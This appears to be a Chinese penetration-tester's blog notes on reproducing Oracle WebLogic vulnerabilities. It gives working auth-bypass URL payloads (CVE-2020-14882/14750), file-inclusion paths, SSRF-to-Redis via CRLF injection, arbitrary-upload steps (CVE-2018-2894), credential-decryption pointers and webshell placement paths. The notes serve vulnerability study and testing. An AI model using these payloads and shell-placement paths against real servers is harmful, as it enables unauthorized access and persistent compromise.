---
title: Weblogic漏洞
date: 2023/5/1 19:50:25
categories:
- 漏洞复现
tags:
- Weblogic
---



[Weblogic控制台中文显示还是英文显示，浏览器语言设置决定的_sxusky的博客-CSDN博客](https://blog.csdn.net/xublog/article/details/45395587)

# 特征

![image-20230819124339256](../../../images/image-20230819124339256.png)

第一次访问路径

![image-20230819131045739](../../../images/image-20230819131045739.png)

/console 管理台页面和版本

![image-20230819150256846](../../../images/image-20230819150256846.png)



# 版本号判断

![image-20230919094414813](../../../images/image-20230919094414813.png)

[第21篇：判断Weblogic详细版本号的方法总结 (qq.com)](https://mp.weixin.qq.com/s/z6q1sBYcHYgzvak98QQmeA)





# 漏洞复现

> Weblogic洞实在太多了。。
>

## 配合文件读取来读取管理员账密

config.xml：搜索`<node-manager-password-encrypted>`

![image-20230819133229460](../../../images/image-20230819133229460.png)

密码解密

- 密钥：SerializedSystemIni.dat（二进制文件，使用burp保存）
- 解密



## 进入管理界面部署war包

![image-20231015112007348](../../../images/image-20231015112007348.png)

![image-20231015111953607](../../../images/image-20231015111953607.png)

![image-20231015112022950](../../../images/image-20231015112022950.png)

![image-20231015112051785](../../../images/image-20231015112051785.png)

![image-20231015112107839](../../../images/image-20231015112107839.png)

![image-20231015112115661](../../../images/image-20231015112115661.png)

访问`shell/shell.jsp`

![image-20231015112126198](../../../images/image-20231015112126198.png)





## 文件包含--CVE-2022-21371

影响版本：12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0

```http
GET .//META-INF/MANIFEST.MF
GET .//WEB-INF/web.xml
GET .//WEB-INF/portlet.xml
GET .//WEB-INF/weblogic.xml
```



## SSRF-**CVE-2014-4210**

漏洞位置在`uddiexplorer/SearchPublicRegistries.jsp`

![img](../../../images/11921423-e5720550a86f7853.png)

搜索`An error has occurred`定位返回值

访问存在的端口，返回`状态码`

![image-20230819125030914](..//images/image-20230819125030914.png)

访问不存在的端口，返回`could not connect over HTTP to server`

![image-20230819124951962](..//images/image-20230819124951962.png)

如果访问的端口不是http协议，则会返回`did not have a valid SOAP content-type`

**服务探测总结**

![img](../../../images/利用WebLogic-SSRF漏洞攻击内网Redis反弹shell5.png)

**SSRF打Redis**

> 在Weblogic的SSRF中，有一个比较大的特点，就是虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。



## 任意文件上传漏洞（CVE-2018-2894）

https://paper.seebug.org/647

产生原因

- 需要知道部署应用的web目录

- 开启了Web Service Test Page，开发模式下可未授权访问/ws_utc/Config.do或者认证后访问/ws_utc/begin.do



复现

首先需要设置home dir为静态目录

```
/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
```

![image-20230819140901725](..//images/image-20230819140901725.png)

- Config.do

![image-20230819140918874](..//images/image-20230819140918874.png)

返回的数据包

![image-20230819141057345](..//images/image-20230819141057345.png)

上传后的文件位置

```
/ws_utc/css/config/keystore/[时间戳]_[文件名]
```

![image-20230819141140037](..//images/image-20230819141140037.png)



- begin.do

![image-20230819141750335](..//images/image-20230819141750335.png)

![image-20230819142834936](..//images/image-20230819142834936.png)

![image-20230819143904277](..//images/image-20230819143904277.png)

将发送的时间戳进行转换：2023-08-19 06:27:55.426

服务器实际上的

![image-20230819143328926](..//images/image-20230819143328926.png)

所以毫秒处需要进行爆破

上传后的文件位置

```
/ws_utc/css/upload/RS_Upload_2023-08-19_06-27-55_[毫秒]/import_file_name_[文件名]
```

![image-20230819143749107](..//images/image-20230819143749107.png)



## 身份校验绕过

```bash
# CVE-2020-14750
/console/images/%252E./console.portal
/console/css/%252E./console.portal

# CVE-2020-14882
/console/css/%252e%252e%252fconsole.portal
/console/images/%252e%252e%252fconsole.portal
```





## 反序列化漏洞

[Weblogic漏洞学习：T3反序列化 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10365)

[Weblogic Xmldecoder反序列化中的命令回显与内存马总结 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10323)

- 直接通过T3协议发送恶意反序列化对象
- 利用T3协议/IIOP协议配合RMP或ND接口反向发送反序列化数据
- 通过 javabean XML方式发送反序列化数据。

### T3协议数据包

> 第二到第七部分内容，开头都是`ac ed 00 05`，说明这些都是序列化的数据。只要把其中一部分替换成我们的序列化数据就可以了

![img](../../../images/WcnkRK.png)

![img](../../../images/WcnYLQ.jpg)

### Payload数据包

![img](../../../images/Wcm5rQ.png)





# 问题

## waf绕过

https://mp.weixin.qq.com/s/8hUYRYoAqjthqgBI_zn9ZA

文件包含判断版本号？

![image-20230919095124958](../../../images/image-20230919095124958.png)

![image-20230919095037612](../../../images/image-20230919095037612.png)

- weblogic_scanner

  这个工具经常提示需要进一步验证的两个漏洞（没成功过。。）

  ```
  CVE-2019-2618：需要知道weblogic的管理员账密进行任意文件上次上传
  CVE-2019-2888：先起一个恶意的xxe服务，再用exp打
  ```

  

## Web路径

[记一次曲折的weblogic上传webshell | chaser's Blog (chaserw.github.io)](https://chaserw.github.io/2021/11/05/记一次曲折的weblogic上传webshell/)

假设上传的jsp为`shell.jsp`

```bash
# 物理路径
/Oracle/Middleware/wlserver_10.3/server/lib/consoleapp/webapp/framework/skins/wlsconsole/images/shell.jsp
# 访问路径
https://xx.com/console/framework/skins/wlsconsole/images/shell.jsp
```

```bash
# 物理路径
/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/随机字符/war/shell.jsp
# 访问路径
https://xx.com/bea_wls_internal/shell.jsp

# 物理路径
/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/uddiexplorer/随机字符/war/shell.jsp
# 访问路径
https://xx.com/uddiexplorer/shell.jsp

# 物理路径
/Oracle/Middleware/user_projects/domains/application/servers/AdminServer/tmp/_WL_user/项目名/随机字符/war/shell.jsp
# 访问路径
https://xx.com/项目名/shell.jsp
```

